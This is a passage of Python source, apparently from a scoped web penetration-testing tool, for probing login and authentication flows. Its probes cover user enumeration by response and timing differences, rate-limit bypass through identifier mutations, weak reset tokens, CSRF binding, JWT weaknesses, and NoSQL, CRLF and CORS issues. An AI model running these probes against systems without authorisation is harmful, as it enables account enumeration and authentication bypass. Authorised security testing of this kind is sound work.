    meaningful = abs(d) >= 0.147
    out["timing_anomaly"] = bool(sig and meaningful)
    out["verdict"] = ("TIMING-SIGNAL" if out["timing_anomaly"] else
                      "weak" if sig else "no-signal")
    if sig and not meaningful:
        out["note"] = "statistically detectable but effect size chhota (practical value kam)"
    return out

def token_predictability(tokens):
    """Token samples me entropy, shared prefix, sequence aur Hamming distance."""
    out = {"samples": len(tokens), "unique": len(set(tokens)), "notes": []}
    if not tokens:
        return out
    out["entropies"] = [round(shannon_entropy(t), 3) for t in tokens]
    out["min_entropy"] = min(out["entropies"])
    out["avg_entropy"] = round(mean(out["entropies"]), 3)
    out["lengths"] = sorted(set(len(t) for t in tokens))
    pref = 0
    for i in range(min(len(t) for t in tokens)):
        if len(set(t[i] for t in tokens)) == 1:
            pref += 1
        else:
            break
    out["shared_prefix_len"] = pref
    if pref >= 4:
        out["notes"].append("shared prefix %d chars -> token me predictable hissa" % pref)
    # per-position entropy
    L = min(len(t) for t in tokens)
    pos_ent = []
    for i in range(L):
        col = [t[i] for t in tokens]
        pos_ent.append(round(shannon_entropy("".join(col)), 3))
    out["per_position_entropy"] = pos_ent
    low_pos = [i for i, e in enumerate(pos_ent) if e < 1.0]
    if len(tokens) >= 3 and low_pos:
        out["low_entropy_positions"] = low_pos[:12]
        out["notes"].append("%d position(s) me <1.0 entropy" % len(low_pos))
    # pairwise Hamming distance
    if len(tokens) >= 2:
        base = tokens[0]
        hams = []
        for t in tokens[1:]:
            m = min(len(base), len(t))
            hams.append(sum(1 for i in range(m) if base[i] != t[i]))
        out["hamming_from_first"] = hams
        out["min_hamming"] = min(hams)
        if min(hams) <= 1:
            out["notes"].append("do tokens me sirf %d char ka farq -> high collision" % min(hams))
    # numeric tail sequence
    tails = []
    for t in tokens:
        m = re.search(r"(\d{4,})$", t)
        if m:
            tails.append(int(m.group(1)))
    if len(tails) >= 2:
        diffs = [tails[i + 1] - tails[i] for i in range(len(tails) - 1)]
        if diffs and all(abs(d) <= 1 for d in diffs):
            out["sequential"] = True
            out["notes"].append("numeric tail <=1 increment (sequential token)")
        elif len(set(abs(d) for d in diffs)) == 1 and abs(diffs[0]) < 1000:
            out["notes"].append("numeric tail constant delta %d" % diffs[0])
    if out["min_entropy"] < 3.0:
        out["notes"].append("min entropy <3.0 -> weak token")
    out["weak"] = bool(out.get("sequential") or out["min_entropy"] < 3.0 or pref >= 4
                       or out.get("min_hamming", 99) <= 1)
    return out

def normalize_username_variants(user, domain=SYNTH_DOMAIN):
    """Identifier normalization mutations (rate-limit bypass probes ke liye)."""
    base = user or "waspuser"
    local = base.split("@")[0]
    return {
        "original": base,
        "upper": local.upper(),
        "mixed": local.capitalize(),
        "plus_tag": "%s+%s@%s" % (local, rand_str(4), domain),
        "dot_variant": "%s.%s@%s" % (local, rand_str(3), domain),
        "trailing_space": base + " ",
        "leading_space": " " + base,
        "double_at": local + "@@" + domain,
        "unicode_fullwidth": local + "\uff20" + domain,
    }

def b64url_decode_json(seg):
    try:
        seg += "=" * (-len(seg) % 4)
        return json.loads(base64.urlsafe_b64decode(seg.encode()).decode("utf-8", "ignore"))
    except Exception:
        return None

def b64url_encode(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")

def jwt_info(tok):
    parts = (tok or "").split(".")
    hdr = b64url_decode_json(parts[0]) if len(parts) > 0 else None
    pay = b64url_decode_json(parts[1]) if len(parts) > 1 else None
    priv_claims = [k for k in (pay or {}) if re.search(
        r"(?i)(admin|role|roles|scope|scopes|perm|privilege|is_?admin|group|tier|plan|"
        r"credit|balance|tenant|org)", k)]
    return {
        "preview": (tok[:20] + "...") if tok and len(tok) > 20 else tok,
        "length": len(tok or ""),
        "entropy": round(shannon_entropy(tok or ""), 3),
        "alg": (hdr or {}).get("alg"),
        "typ": (hdr or {}).get("typ"),
        "kid": (hdr or {}).get("kid"),
        "jku": (hdr or {}).get("jku"),
        "header_keys": sorted((hdr or {}).keys()),
        "payload_keys": sorted((pay or {}).keys()),
        "privilege_claims": priv_claims,
        "has_exp": bool((pay or {}).get("exp")),
        "has_iat": bool((pay or {}).get("iat")),
        "has_nbf": bool((pay or {}).get("nbf")),
        "iss": (pay or {}).get("iss"),
        "aud": (pay or {}).get("aud"),
        "has_third_segment": len(parts) == 3 and bool(parts[2]),
        "header": hdr,
        "payload": pay,
    }

def find_jwts(text):
    seen, out = set(), []
    for m in JWT_RE.finditer(text or ""):
        t = m.group(0)
        if t not in seen:
            seen.add(t)
            out.append(t)
    return out

def detect_lockout(status, text, headers):
    """(bool, reason). Ek generic 401 ko lockout nahi maanta."""
    if status in (429, 423):
        return True, "http-%d" % status
    ra = ""
    for k, v in (headers or {}).items():
        if k.lower() == "retry-after":
            ra = v
    if ra:
        return True, "retry-after:%s" % ra
    m = LOCKOUT_RE.search(text or "")
    if m:
        return True, "msg:" + re.sub(r"\s+", " ", m.group(1)).lower()
    return False, ""

def drf_compare(a, b):
    """
    Differential Response Fingerprinting v2.
    v1 me sirf status+title+similarity+len tha. v2 me JSON error-code oracle,
    redirect target, WWW-Authenticate aur debug-leak bhi compare hote hain.
    """
    la, lb = len(a.body), len(b.body)
    sig = {
        "status_a": a.status, "status_b": b.status, "status_same": a.status == b.status,
        "len_a": la, "len_b": lb, "len_delta": abs(la - lb),
        "len_ratio": round(min(la, lb) / float(max(1, max(la, lb))), 4),
        "title_a": title_of(a.text), "title_b": title_of(b.text),
        "title_same": title_of(a.text) == title_of(b.text),
        "body_similarity": round(shingle_sim(a.text, b.text), 4),
        "ct_a": a.header("Content-Type"), "ct_b": b.header("Content-Type"),
        "loc_a": a.header("Location"), "loc_b": b.header("Location"),
        "loc_same": a.header("Location") == b.header("Location"),
        "www_a": a.header("WWW-Authenticate"), "www_b": b.header("WWW-Authenticate"),
    }
    score = 0
    if not sig["status_same"]:
        score += 40
    if not sig["title_same"]:
        score += 15
    if not sig["loc_same"]:
        score += 12
    score += int((1.0 - sig["body_similarity"]) * 100)
    if sig["len_delta"] > 32:
        score += 10
    ja, jb = a.json(None), b.json(None)
    if isinstance(ja, dict) and isinstance(jb, dict):
        ea, eb = _json_error_shape(ja), _json_error_shape(jb)
        sig["json_a"] = ea
        sig["json_b"] = eb
        sig["json_oracle"] = bool(ea and eb and ea != eb)
        if sig["json_oracle"]:
            score += 25
    sig["diff_score"] = max(0, min(score, 100))
    sig["verdict"] = ("DIFFERENT" if sig["diff_score"] >= 30 else
                      "SUSPICIOUS" if sig["diff_score"] >= 12 else "SAME")
    return sig

def _json_error_shape(doc):
    """JSON error response ka 'fingerprint' - enumeration oracle ke liye."""
    out = {}
    def walk(obj, prefix="", depth=0):
        if depth > 3:
            return
        if isinstance(obj, dict):
            for k, v in obj.items():
                if ERROR_KEY_RE.match(str(k)):
                    if isinstance(v, (str, int, bool)) or v is None:
                        out[prefix + str(k).lower()] = str(v)[:60]
                    else:
                        walk(v, prefix + str(k).lower() + ".", depth + 1)
                elif isinstance(v, (dict, list)) and depth < 2:
                    walk(v, prefix + str(k).lower() + ".", depth + 1)
        elif isinstance(obj, list):
            for item in obj[:3]:
                walk(item, prefix, depth + 1)
    walk(doc)
    return out

def analyze_cookie(raw_cookie, is_https=True):
    """Cookie flags + __Host-/__Secure- prefix rules + scope analysis."""
    parts = (raw_cookie or "").split(";")
    head = parts[0]
    name = (head.split("=")[0] or "").strip()
    low = raw_cookie.lower()
    flags = {"httponly": "httponly" in low, "secure": "secure" in low,
             "samesite": "samesite" in low, "samesite_value": "",
             "domain": "", "path": "", "max_age": None, "expires": None}
    m = re.search(r"samesite\s*=\s*([a-z]+)", low)
    if m:
        flags["samesite_value"] = m.group(1)
    m = re.search(r"domain\s*=\s*([^;]+)", low)
    if m:
        flags["domain"] = m.group(1).strip()
    m = re.search(r"path\s*=\s*([^;]+)", low)
    if m:
        flags["path"] = m.group(1).strip()
    m = re.search(r"max-age\s*=\s*(\d+)", low)
    if m:
        flags["max_age"] = int(m.group(1))
    sessionish = bool(re.search(r"(sess|sid|jsessionid|phpsessid|asp\.net|token|auth|jwt|"
                                r"remember|logged)", name, re.I))
    missing = []
    if sessionish:
        if not flags["httponly"]:
            missing.append("HttpOnly")
        if is_https and not flags["secure"]:
            missing.append("Secure")
        if not flags["samesite"] or flags["samesite_value"] == "none":
            missing.append("SameSite")
    violations = []
    if name.startswith("__Host-"):
        if not flags["secure"]:
            violations.append("__Host- bina Secure")
        if flags["domain"]:
            violations.append("__Host- par Domain set hai")
        if flags["path"] not in ("", "/"):
            violations.append("__Host- par Path=%s (must be /)" % flags["path"])
    if name.startswith("__Secure-") and not flags["secure"]:
        violations.append("__Secure- bina Secure")
    return {"name": name, "flags": flags, "session_like": sessionish,
            "missing": missing, "prefix_violations": violations,
            "cookie_scope": ("domain-wide" if flags["domain"].startswith(".")
                             else "host-only" if flags["domain"] else "unset")}

def classify_lockout_model(status_series, reasons, identifiers_used):
    """
    Lockout model classify karo: per-IP / per-account / global / none.
    Ye v1 me nahi tha - v1 sirf 'throttled=True' kehta tha.
    """
    if not status_series:
        return "none", "koi attempt nahi hua"
    if not any(r for r in reasons if r):
        return "none", "throttle ka koi signal nahi"
    distinct_idents = len(set(identifiers_used or []))
    distinct_ips = 1
    if distinct_idents > 1:
        return ("global-or-per-IP",
                "%d alag identifiers par bhi throttle aaya -> per-account nahi lag raha" % distinct_idents)
    return ("per-account-or-per-IP", "ek hi identifier par throttle - per-account ya per-IP")

def build_hypotheses(F, enum_report, rl_report, reset_report, mfa_report, reg_report,
                     oauth_report, cookie_report, jwt_report, csrf_report, live,
                     inj_report=None, redir_report=None, hard_report=None, jwt_deep=None,
                     cors_report=None):
    """
    Testable hypotheses + kill-tests. Ye wahi methodology hai jo Phase 8 me thi,
    ab auth findings ke liye.
    """
    H = []

    def add(hid, statement, because, kill, phase):
        H.append({"id": hid, "hypothesis": statement, "because": because,
                  "kill_test": kill, "next_phase": phase})

    for u, r in (enum_report.get("endpoints") or {}).items():
        if r.get("enumeration_likely"):
            add("H-ENUM-%s" % sha1(u)[:4],
                "%s account existence leak karta hai" % u,
                r.get("summary", ""),
                "Ek hi synthetic identifier ko 3 baar bhejo; agar responses bilkul same aa jayein "
                "aur timing overlap kare to hypothesis REJECT karo.",
                "10-sessions")
    for u, r in (rl_report or {}).items():
        if not r.get("throttled"):
            add("H-RL-%s" % sha1(u)[:4],
                "%s par effective rate limiting nahi hai" % u,
                r.get("summary", ""),
                "Dheere-dheere (5s gap) 10 attempts karo; agar lockout/429 aa jaye to REJECT karo.",
                "9-auth")
        if r.get("throttled") and (r.get("bypass_matrix") or {}).get("bypass_likely"):
            add("H-BYP-%s" % sha1(u)[:4],
                "%s ka throttling header/identifier mutation se bypass ho sakta hai" % u,
                (r.get("bypass_matrix") or {}).get("summary", ""),
                "Control probe (bina header, same identifier) bhejo; agar wo bhi pass ho jaye "
                "to bypass claim REJECT karo (throttle hi nahi tha).",
                "9-auth")
    for u, r in (reset_report or {}).items():
        if r.get("host_header_reflected"):
            add("H-HOST-%s" % sha1(u)[:4],
                "Reset link me Host header inject ho sakta hai",
                "Injected host response me reflect hua",
                "Ek aur different injected host try karo; agar wo reflect na ho to REJECT karo.",
                "15-ssrf")
        if (r.get("token") or {}).get("weak"):
            add("H-TOK-%s" % sha1(u)[:4],
                "%s ka reset token predictable hai" % u,
                json.dumps(r.get("token", {}), default=str)[:180],
                "Kam se kam 3 aur token sample lo; agar Hamming distance badh jaye to REJECT karo.",
                "9-auth")
    for u, r in (mfa_report or {}).items():
        if r.get("no_ratelimit"):
            add("H-MFA-%s" % sha1(u)[:4],
                "%s par OTP brute-force possible hai (rate limit nahi)" % u,
                r.get("summary", ""),
                "10 attempts ke baad bhi 200 mile to confirm; agar koi bhi throttle signal aaye to REJECT.",
                "9-auth")
    for u, cookies in (cookie_report or {}).items():
        for c in cookies:
            if c.get("missing"):
                add("H-COOK-%s" % sha1(u + c.get("name", ""))[:4],
                    "%s ka session cookie '%s' hardening missing hai" % (u, c.get("name")),
                    "missing flags: %s" % ", ".join(c["missing"]),
                    "Response header ko dobara check karo; agar flags kabhi bhi present hon to REJECT.",
                    "10-sessions")
    for ji in (jwt_report or []):
        if ji.get("alg") in ("none", "HS256") or not ji.get("has_exp"):
            add("H-JWT-%s" % sha1(str(ji.get("endpoint")) + str(ji.get("alg")))[:4],
                "%s ka pre-auth JWT weak hai" % ji.get("endpoint"),
                "alg=%s has_exp=%s" % (ji.get("alg"), ji.get("has_exp")),
                "Token ko protected endpoint par bhejo; agar reject ho to alg weakness exploitable nahi -> REJECT.",
                "10-sessions")
    for u, r in (csrf_report or {}).items():
        if r.get("static"):
            add("H-CSRF-%s" % sha1(u)[:4],
                "%s ka CSRF token session-bound nahi hai" % u,
                "do alag session me same token mila",
                "Token ke sath ek aur fresh session lo; agar token badal jaye to REJECT karo.",
                "10-sessions")
    for f in F.items:
        if f["key"] in ("jwt_alg_none_accepted", "jwt_signature_not_verified"):
            add("H-JWTTAMPER-%s" % sha1(f["endpoint"])[:4],
                "%s tampered JWT accept karta hai" % f["endpoint"],
                f["detail"],
                "Tampered token ko do baar bhejo; agar dobara reject ho (intermittent) to REJECT karo.",
                "10-sessions")
    # ---- v10 hypotheses ----
    for u, r in (inj_report or {}).items():
        if r.get("nosql_accepted"):
            add("H-NOSQL-%s" % sha1(u)[:4],
                "%s NoSQL operator ($ne/$gt) se bypass hota hai" % u,
                "operator probe par status/shape materially badla",
                "Same probe 2 baar dobara bhejo (synthetic ident par) - agar ab bhi synthetic "
                "reject ho aur sirf 'admin' accept ho to real bypass hai; warna REJECT.",
                "13-injection")
        if r.get("type_confusion"):
            add("H-TC-%s" % sha1(u)[:4],
                "%s me JSON type confusion se auth logic dodge hoti hai" % u,
                "null/0 password types par response differential",
                "Manual client se wahi payloads bhejo; agar app schema-validation reject kare to REJECT.",
                "13-injection")
    for u, r in (redir_report or {}).items():
        if r.get("open_redirect"):
            add("H-REDIR-%s" % sha1(u)[:4],
                "%s ka redirect param externally-controlled hai" % u,
                "wasp-invalid host par 3xx Location mila",
                "Ek aur benign .test host try karo; agar redirect na ho to REJECT.",
                "14-xss")
        if r.get("crlf"):
            add("H-CRLF-%s" % sha1(u)[:4],
                "%s me CRLF injection se headers inject hote hain" % u,
                "X-Wasp-Probe response headers me mila",
                "Dusra CRLF variant try karo; agar header na bane to REJECT (encoding-safe tha).",
                "13-injection")
    for rec in ((jwt_deep or {}).get("key_injection") or []):
        add("H-JWTKEY-%s" % sha1(str(rec.get("endpoint")))[:4],
            "JWT key-injection (jku/x5u/jwk) se key control ho sakti hai",
            "header me attacker-controllable key URL/param",
            "Own jwks host karke (RoE-approved) ek forged token bhejo; reject hua to REJECT.",
            "10-sessions")
    for u, r in (cors_report or {}).items():
        if r.get("reflected") and r.get("credentials"):
            add("H-CORS-%s" % sha1(u)[:4],
                "%s par CORS cred-reflection authenticated data leak karega" % u,
                r.get("summary", ""),
                "Browser-based PoC (RoE-approved origin) se 1 request; agar ACAO na aaye to REJECT.",
                "10-sessions")
    return H

def write_test_plan(out, scope, H, F, coverage, stats_summary):
    L = []
    A = L.append
    A("# Phase 9 - Authentication Test Plan & Findings")
    A("")
    A("**Engagement:** `%s`  " % scope.engagement)
    A("**Generated:** %s  " % now_iso())
    A("**Engine:** WASP v%s / auth plan v%s" % (VERSION, PLAN_VERSION))
    A("")
    A("> Ye plan **bounded, non-destructive** probes par based hai. Har hypothesis ke saath")
    A("> ek KILL TEST diya gaya hai - agar kill-test pass ho jaye to hypothesis REJECT karo.")
    A("")
    A("---")
    A("")
    A("## 1. Findings summary")
    A("")
    if F.items:
        A("| ID | Severity | Title | Endpoint |")
        A("|---|---|---|---|")
        for f in F.items:
            A("| %s | **%s** | %s | `%s` |" % (f["id"], f["severity"], f["title"],
                                                urllib.parse.urlparse(f["endpoint"]).path))
    else:
        A("_Koi finding confirm nahi hui._")
    A("")
    A("## 2. Hypotheses + kill-tests")
    A("")
    for h in H:
        A("### %s" % h["id"])
        A("")
        A("- **HYPOTHESIS:** %s" % h["hypothesis"])
        A("- **BECAUSE:** %s" % h["because"])
        A("- **KILL TEST:** %s" % h["kill_test"])
        A("- **NEXT PHASE:** `%s`" % h["next_phase"])
        A("")
    A("## 3. Coverage matrix (tested vs untested)")
    A("")
    A("| Control | Status |")
    A("|---|---|")
    for k, v in coverage.items():
        A("| %s | %s |" % (k, v))
    A("")
    A("## 4. Statistical method (timing analysis)")
    A("")
    A("| Test | Kya batata hai |")
    A("|---|---|")
    A("| Welch t-test | mean response-time shift (unequal variance) |")
    A("| Mann-Whitney U (tie-corrected) | rank shift - outliers se robust |")
    A("| Cliff's delta | effect size - practically bada hai ya nahi |")
    A("| Bootstrap CI | median difference ka confidence interval |")
    A("| Modified z-score (MAD) | v1 ka method, ab supporting evidence ke taur par |")
    A("")
    if stats_summary:
        A("```")
        A(json.dumps(stats_summary, indent=2, default=str)[:1800])
        A("```")
    A("")
    A("## 5. Limitations")
    A("")
    A("- Ye **bounded** testing hai: attempts capped, lockout par abort.")
    A("- `reset_token_weak` sirf tab detect hota hai jab token HTTP response me aaye -")
    A("  email-based reset me token kabhi nahi dikhta, isliye 'no token' = 'weak nahi' NAHI.")
    A("- Timing analysis shared/VPN network par noisy ho sakti hai; effect size dekho, sirf p-value nahi.")
    A("- Ye plan credential guessing nahi karta (koi wordlist attack nahi).")
    A("- Ye kisi bhi real user ko email nahi bhejta (synthetic `.test` identifiers only).")
    A("")
    save_text(os.path.join(out, "auth_test_plan.md"), "\n".join(L) + "\n")


# ---------------------------------------------------------------------------
# STAGE A - AUTH SURFACE DISCOVERY (Phase 8 priority queue aware)
# ---------------------------------------------------------------------------

def _phase8_auth_targets(base_dir, eng, scope):
    """
    Phase 8 ke priority_queue.json se auth-related targets uthao, priority ke
    saath. Isse Phase 9 ka pehla target wahi hota hai jo Phase 8 ne sabse
    zyada scored tha - guess-work nahi.
    """
    pq = load_json(os.path.join(base_dir, eng, "surface", "priority_queue.json"), None)
    rows = []
    if isinstance(pq, dict):
        for r in (pq.get("queue") or []) + (pq.get("diverse_queue") or []):
            url = r.get("target") or ""
            if not url.startswith("http"):
                continue
            cls = " ".join(r.get("classes") or [])
            path = urllib.parse.urlparse(url).path
            if AUTH_PATH_RE.search(path) or "Auth/Credential" in cls or "Access-Control" in cls:
                rows.append({"url": url, "priority": r.get("priority", 0),
                             "classes": r.get("classes") or [], "confidence": r.get("confidence"),
                             "why": (r.get("why") or [])[:2]})
    # dedupe by url, best priority
    best = {}
    for r in rows:
        u = r["url"].split("#")[0]
        if u not in best or r["priority"] > best[u]["priority"]:
            best[u] = r
    out = sorted(best.values(), key=lambda x: -x["priority"])
    return [r for r in out if scope.check_url(r["url"], raise_on_fail=False)]

def discover_auth_surface(base_dir, scope, out, conf=None):
    """
    Auth candidates = (Phase 8 priority targets) + (Phase 2-7 artifact mining)
    + (well-known paths). Priority order preserve hota hai, phir scope filter.
    """
    conf = conf or {}
    eng = scope.engagement
    ranked = []

    # 1) Phase 8 priority queue (sabse bharosemand source)
    if conf.get("auth_use_phase8_priority", True):
        for r in _phase8_auth_targets(base_dir, eng, scope):
            ranked.append(r)

    # 2) Phase 2-7 raw artifact mining (backup, agar Phase 8 na chala ho)
    cands = set()
    for mod in ("understand", "content", "js", "passive", "active", "surface"):
        d = os.path.join(base_dir, eng, mod)
        if not os.path.isdir(d):
            continue
        for root, _, files in os.walk(d):
            if os.sep + "evidence" in root or os.sep + "_state" in root:
                continue
            for fn in files:
                if not fn.endswith((".json", ".txt", ".md")):
                    continue
                fp = os.path.join(root, fn)
                try:
                    txt = open(fp, "r", errors="ignore").read()
                except Exception:
                    continue
                for m in re.finditer(r"https?://[^\s\"'<>,\]]+", txt):
                    u = m.group(0).rstrip(").,;")
                    if AUTH_PATH_RE.search(urllib.parse.urlparse(u).path):
                        cands.add(u.split("#")[0])
                if fn.endswith(".txt"):
                    for line in txt.splitlines():
                        line = line.strip()
                        if line.startswith("/") and AUTH_PATH_RE.search(line):
                            for o in _authorized_origins(scope)[:2]:
                                cands.add(o.rstrip("/") + line)

    # 3) well-known paths (origin-aware -> IP:port targets bhi sahi chalti hain)
    for o in _authorized_origins(scope)[:5]:
        for p in WELL_KNOWN_AUTH:
            cands.add(o.rstrip("/") + p)

    known = {r["url"] for r in ranked}
    for u in sorted(cands):
        if u in known:
            continue
        if scope.check_url(u, raise_on_fail=False):
            ranked.append({"url": u, "priority": 0, "classes": [], "confidence": "low",
                           "why": ["well-known / artifact-mined path"]})

    # 4) seed URL base par bhi login maango (SPA me /login HTML me nahi hota)
    for s in scope.seed_urls():
        for p in ("/login", "/api/auth/login", "/api/login"):
            u = s.rstrip("/") + p
            if scope.check_url(u, raise_on_fail=False) and u not in known:
                ranked.append({"url": u, "priority": 5, "classes": [],
                               "confidence": "low", "why": ["seed-derived login path"]})

    cap = int(conf.get("auth_surface_cap", 25))
    return ranked[:cap]

def _authorized_hosts(scope):
    """Sirf hostname list (domain-based logic ke liye)."""
    hosts = list(getattr(scope, "domains", []) or [])
    hosts += [w.lstrip("*.") for w in (getattr(scope, "wildcards", []) or [])]
    for u in scope.seed_urls():
        h = host_of(u)
        if h:
            hosts.append(h)
    out, seen = [], set()
    for h in hosts:
        if h and h not in seen:
            seen.add(h)
            out.append(h)
    return out

def _authorized_origins(scope):
    """
    scheme://host:port origins. IP:port targets (jaise http://127.0.0.1:8443) ke
    liye ye zaroori hai - warna well-known path probe port kho kar connection
    refused deti hai (real bug jo mock test me pakda gaya).
    """
    origins, seen = [], set()
    for u in scope.seed_urls():
        p = urllib.parse.urlparse(u)
        if p.netloc:
            o = "%s://%s" % (p.scheme, p.netloc)
            if o not in seen:
                seen.add(o)
                origins.append(o)
    for h in (list(getattr(scope, "domains", []) or []) +
              [w.lstrip("*.") for w in (getattr(scope, "wildcards", []) or [])]):
        o = "https://" + h
        if o not in seen:
            seen.add(o)
            origins.append(o)
    return origins


# ---------------------------------------------------------------------------
# STAGE B - PROBE & FLOW MAPPING
# ---------------------------------------------------------------------------

def probe_endpoint(http, url, conf=None):
    """Read-only GET: forms, CSRF, cookies, JWT, auth scheme, transport, methods.
    v10: + hardening signals (XFO/CSP-frame/cache/referrer/CDN), webauthn marker,
    captcha marker, redirect-param inventory, token-in-URL indicator."""
    conf = conf or {}
    r = http.request("GET", url, allow_redirects=True)
    pu = urllib.parse.urlparse(r.url or url)
    rec = {"url": url, "status": r.status, "error": r.error, "final_url": r.url,
           "len": len(r.body), "content_type": r.header("Content-Type"),
           "server": r.header("Server"), "scheme": pu.scheme,
           "www_authenticate": r.header("WWW-Authenticate"),
           "location": r.header("Location"),
           "set_cookie": [v for k, v in r.headers.items() if k.lower() == "set-cookie"],
           "body_sha1": sha1(r.body) if r.status else None,
           "debug_leak": bool(DEBUG_LEAK_RE.search(r.text or "")),
           "forms": []}
    # ---- v10 hardening capture (passive, response se hi) ----
    headers_lc = {k.lower(): v for k, v in (r.headers.items() if r.headers else [])}
    rec["hardening"] = {
        "x_frame_options": headers_lc.get("x-frame-options"),
        "csp": headers_lc.get("content-security-policy"),
        "frame_ancestors": (re.search(r"frame-ancestors\s+([^;]+)",
                                      headers_lc.get("content-security-policy") or "", re.I)
                            .group(1).strip() if re.search(
                                r"frame-ancestors", headers_lc.get("content-security-policy") or "", re.I)
                            else None),
        "cache_control": headers_lc.get("cache-control"),
        "referrer_policy": headers_lc.get("referrer-policy"),
        "cdn_hints": sorted(k for k in headers_lc if CDN_HEADER_RE.match(k)),
        "hsts": headers_lc.get("strict-transport-security"),
        "x_content_type_options": headers_lc.get("x-content-type-options"),
        "cross_origin_opener_policy":
            headers_lc.get("cross-origin-opener-policy"),
        "cross_origin_embedder_policy":
            headers_lc.get("cross-origin-embedder-policy"),
        "cross_origin_resource_policy":
            headers_lc.get("cross-origin-resource-policy"),
        "permissions_policy": headers_lc.get("permissions-policy"),
    }
    rec["webauthn"] = bool(WEBAUTHN_RE.search(r.text or ""))
    rec["captcha"] = bool(CAPTCHA_RE.search(r.text or "") or CAPTCHA_RE.search(json.dumps(headers_lc)))
    rec["token_in_url"] = bool(JWT_URL_RE.search(url))
    rec["saml_markers"] = sorted(set(m.group(0).lower() for m in SAML_RE.finditer(r.text or "")))[:6]
    path_only = urllib.parse.urlparse(url).path
    ct_low = (r.header("Content-Type") or "").lower()
    rec["wp_users"] = bool(WP_USERS_RE.search(path_only)) and bool(
        r.status == 200 and "json" in ct_low and len(r.body or b"") > 20)
    rec["nextauth"] = bool(NEXTAUTH_PATH_RE.search(path_only)) and bool(r.status and r.status < 400)
    # redirect params: URL query + form hidden fields
    rp = []
    try:
        for k in urllib.parse.parse_qs(urllib.parse.urlparse(url).query).keys():
            if REDIRECT_PARAM_RE.match(k):
                rp.append(k)
    except Exception:
        pass
    rec["redirect_params"] = sorted(set(rp))
    if r.status and "html" in (r.header("Content-Type") or "").lower():
        forms = parse_forms(r.text, r.url)
        rec["forms"] = forms
        rec["has_password"] = any(f["has_password"] for f in forms)
        rec["register_form"] = any(
            f["has_password"] and REGISTER_HINT_RE.search(f["action"]) for f in forms)
        rec["csrf_present"] = any(f["csrf_fields"] for f in forms)
        rec["password_policy_hint"] = _password_policy_hint(forms)
        for f in forms:
            for fld in f.get("fields", []):
                if REDIRECT_PARAM_RE.match(fld.get("name") or ""):
                    rec["redirect_params"] = sorted(set((rec["redirect_params"] or []) + [fld["name"]]))
    else:
        rec["forms"] = []
    rec["jwts"] = find_jwts(r.text)[:5]
    if conf.get("auth_allow_method_matrix", True) and r.status:
        rec["methods"] = _method_matrix(http, url)
    return rec

def _password_policy_hint(forms):
    """Form attributes se client-side password policy infer karo."""
    for f in forms or []:
        for fld in f.get("fields", []):
            if fld.get("type") == "password":
                ml = fld.get("maxlength")
                pat = fld.get("pattern") or ""
                ac = fld.get("autocomplete") or ""
                weak = True
                notes = []
                try:
                    if ml and int(ml) < 8:
                        notes.append("maxlength=%s (bahut chhota)" % ml)
                    else:
                        weak = False
                except Exception:
                    weak = False
                if not pat:
                    notes.append("koi pattern attribute nahi (server-side policy confirm karo)")
                if ac.lower() in ("", "on"):
                    notes.append("autocomplete on/unspecified")
                return {"maxlength": ml, "pattern": pat, "autocomplete": ac,
                        "weak_hint": weak, "notes": notes[:4]}
    return {}

def _method_matrix(http, url):
    """OPTIONS + HEAD (read-only) se allowed methods nikaalo."""
    out = {}
    ro = http.request("OPTIONS", url, allow_redirects=False)
    if ro.status:
        out["OPTIONS"] = {"status": ro.status, "allow": ro.header("Allow")}
    rh = http.request("HEAD", url, allow_redirects=False)
    if rh.status:
        out["HEAD"] = {"status": rh.status, "content_type": rh.header("Content-Type")}
    return out


# ---------------------------------------------------------------------------
# STAGE C - CSRF TOKEN BINDING
# ---------------------------------------------------------------------------

def csrf_token_binding(http, scope, url, probe, conf):
    """
    Do INDEPENDENT session se login form lo aur CSRF token compare karo.
    Same token => token session-bound nahi (cross-session reuse possible).
    """
    res = {"endpoint": url, "sessions": [], "static": False, "summary": ""}
    samples = max(2, int(conf.get("auth_csrf_token_samples", 2)))
    tokens, cookies = [], []
    for i in range(samples):
        ident = http.identity("csrf%d" % i)
        r = ident.request("GET", url, allow_redirects=True)
        if not r.status:
            continue
        forms = parse_forms(r.text, r.url)
        csrf = []
        for f in forms:
            for cf in f.get("csrf_fields", []):
                for fld in f.get("fields", []):
                    if fld["name"] == cf and fld.get("value"):
                        csrf.append({"field": cf, "value_len": len(fld["value"]),
                                     "fingerprint": sha1(fld["value"])[:12]})
        ck = [c["name"] for c in ident.session_export()]
        tokens.append(csrf)
        cookies.append(ck)
        res["sessions"].append({"index": i, "status": r.status, "csrf": csrf, "cookies": ck})
    if len(tokens) >= 2 and tokens[0] and tokens[1]:
        fp0 = {t["fingerprint"] for t in tokens[0]}
        fp1 = {t["fingerprint"] for t in tokens[1]}
        if fp0 == fp1:
            res["static"] = True
            res["summary"] = "same CSRF token do alag sessions me -> session-bound nahi"
        else:
            res["summary"] = "CSRF token per-session badal raha hai (bound lag raha hai)"
    else:
        res["summary"] = "CSRF token nahi mila ya sirf ek session sample mila"
    return res


# ---------------------------------------------------------------------------
# STAGE D - USER ENUMERATION v2 (DRF + JSON oracle + robust stats)
# ---------------------------------------------------------------------------

def enum_login_endpoint(http, scope, url, probe, conf):
    """
    Enumeration v2:
      * synthetic baseline (reserved .test TLD)
      * plausible identifiers -> DRF v2 (shape fingerprint + JSON error-code oracle)
      * timing: Welch t + Mann-Whitney U + Cliff's delta + bootstrap CI
      * v1 ka MAD z-score bhi supporting evidence ke taur par
    Bounded + lockout-safe.
    """
    res = {"endpoint": url, "attempts": 0, "locked_out": False, "locked_out_reason": "",
           "enumeration_likely": False, "signals": {}, "identifiers_used": [],
           "stats_method": "welch+mannwhitney+cliffsdelta+bootstrap"}
    cap = int(conf["auth_max_attempts"])
    n_ident = int(conf.get("auth_enum_identifiers", 5))
    repeats = int(conf["auth_timing_repeats"])

    base_r = _send_login(http, probe, synth_identifier("baseline"), "WaspInvalid!" + rand_str(4))
    res["attempts"] += 1
    res["identifiers_used"].append("synthetic-baseline")
    lo, why = detect_lockout(base_r.status, base_r.text, base_r.headers)
    if lo:
        res.update({"locked_out": True, "locked_out_reason": why})
        res["summary"] = "Pehle hi probe par lockout/throttle (%s) - safely abort." % why
        return res

    timing_plausible, timing_bogus = [], []
    worst = None
    json_oracle_hits = []
    for user in PLAUSIBLE_USERS[:n_ident]:
        if res["attempts"] >= cap:
            break
        r = _send_login(http, probe, user, "WaspInvalid!" + rand_str(4))
        res["attempts"] += 1
        res["identifiers_used"].append(user)
        lo, why = detect_lockout(r.status, r.text, r.headers)
        if lo:
